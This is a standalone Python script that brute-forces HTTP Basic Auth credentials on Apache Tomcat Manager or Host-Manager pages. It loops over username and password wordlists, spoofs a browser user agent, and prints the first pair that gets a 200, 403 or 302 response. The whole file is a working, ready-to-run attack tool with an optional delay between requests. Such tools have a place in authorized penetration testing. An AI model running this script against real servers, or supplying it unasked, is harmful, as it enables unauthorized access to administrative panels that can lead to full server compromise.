#!/usr/bin/env python3

import requests
import argparse
import base64
import time
import sys
from termcolor import cprint, colored

parser = argparse.ArgumentParser(description="Tomcat Manager or Host-Manager Credential Bruteforcing")

parser.add_argument("-U", "--url", type=str, required=True, help="Base URL to the Tomcat page (e.g., http://target.com)")
parser.add_argument("-P", "--path", type=str, required=True, help="Manager or host-manager URI (e.g., /host-manager/html)")
parser.add_argument("-u", "--usernames", type=str, required=True, help="Path to file containing usernames")
parser.add_argument("-p", "--passwords", type=str, required=True, help="Path to file containing passwords")
parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output to see attempted credentials and encoded values")
parser.add_argument("-r", "--rate-limit", type=float, default=0, help="Delay in seconds between requests (e.g., 0.5 for half a second)")

args = parser.parse_args()

new_url = args.url.rstrip("/") + "/" + args.path.lstrip("/")

try:
    with open(args.usernames, "r", encoding="utf-8") as f_users:
        usernames = [line.strip() for line in f_users if line.strip()]
        
    with open(args.passwords, "r", encoding="utf-8") as f_pass:
        passwords = [line.strip() for line in f_pass if line.strip()]
except FileNotFoundError as e:
    cprint(f"[!] Error: {e}", "red", attrs=['bold'])
    exit(1)

cprint("\n[+] Starting Brute-force Attack...", "red", attrs=['bold'])

success = False

try:
    for username in usernames:
        for password in passwords:
            creds = f"{username}:{password}"
            encoded_creds = base64.b64encode(creds.encode()).decode()
            
            headers = {
                "Authorization": f"Basic {encoded_creds}",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0"
            }

            try:
                response = requests.get(new_url, headers=headers, timeout=5)

                if args.verbose:
                    cprint(f"[*] Trying {username}:{password} → Encoded: {encoded_creds} → HTTP {response.status_code}", "cyan")

                if response.status_code in [200, 403, 302]:
                    cprint("\n[+] Success!", "green", attrs=['bold'])
                    cprint(f"[+] Username: {username}\n[+] Password: {password}\n[+] Encoded: {encoded_creds}", "green", attrs=['bold'])
                    success = True
                    break

            except requests.exceptions.RequestException as e:
                cprint(f"[!] Connection Error: {e}", "red", attrs=['bold'])
                exit(1)

            if args.rate_limit > 0:
                time.sleep(args.rate_limit)

        if success:
            break

except KeyboardInterrupt:
    cprint("\n[!] Attack stopped. Exiting...", "yellow", attrs=['bold'])
    sys.exit(0)

if not success:
    cprint("\n[+] Failed!!", "red", attrs=['bold'])
    cprint("[+] Could not find valid credentials.", "red", attrs=['bold'])

